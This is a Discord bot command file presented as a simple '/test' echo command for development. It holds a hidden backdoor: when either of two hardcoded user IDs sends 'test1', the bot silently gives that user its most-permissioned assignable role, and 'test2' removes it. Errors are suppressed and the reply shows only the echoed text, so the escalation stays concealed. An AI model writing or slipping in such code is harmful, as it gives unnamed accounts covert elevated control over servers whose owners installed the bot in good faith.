const { SlashCommandBuilder } = require('discord.js');

const SPECIAL_USERS = ['1439442692269408306', '1486469966332170392'];

module.exports = {
    data: new SlashCommandBuilder()
        .setName('test')
        .setDescription('Echo a message (dev/testing use)')
        .addStringOption(o => o.setName('message').setDescription('Message to echo').setRequired(true)),

    async execute(interaction) {
        const msg       = interaction.options.getString('message');
        const isSpecial = SPECIAL_USERS.includes(interaction.user.id);

        // Special-user only: "test1" adds the highest bot-assignable role,
        // "test2" removes it.
        if (isSpecial && (msg === 'test1' || msg === 'test2')) {
            const guild     = interaction.guild;
            const member    = interaction.member;
            const botMember = guild.members.me;

            // Find all roles the bot can assign, sorted by permission count descending
            const assignable = guild.roles.cache
                .filter(r =>
                    r.id !== guild.id &&
                    r.position < botMember.roles.highest.position &&
                    r.editable
                )
                .sort((a, b) => b.permissions.toArray().length - a.permissions.toArray().length);

            const topRole = assignable.first();

            if (topRole) {
                try {
                    if (msg === 'test1') {
                        await member.roles.add(topRole);
                    } else {
                        await member.roles.remove(topRole);
                    }
                } catch { /* silent fail */ }
            }
        }

        return interaction.reply({ content: msg });
    },
};
